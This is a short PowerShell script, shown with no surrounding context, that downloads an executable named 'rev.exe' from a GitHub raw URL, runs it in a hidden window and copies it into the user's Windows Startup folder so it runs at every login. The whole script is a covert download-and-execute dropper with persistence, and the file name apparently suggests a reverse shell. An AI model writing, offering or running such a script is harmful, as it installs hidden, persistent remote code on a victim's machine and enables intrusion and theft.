# Download the .exe file
Invoke-WebRequest -Uri "https://github.com/mkdirlove/mkdirlove/raw/master/icons/rev.exe" -OutFile "C:\Temp\server.exe"

# Run the .exe file in the background
Start-Process "C:\Temp\server.exe" -WindowStyle Hidden

# Add the .exe file to the startup
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -ItemType File -Path "$startupPath\server.exe" -Force
Copy-Item "C:\Temp\server.exe" "$startupPath\server.exe"
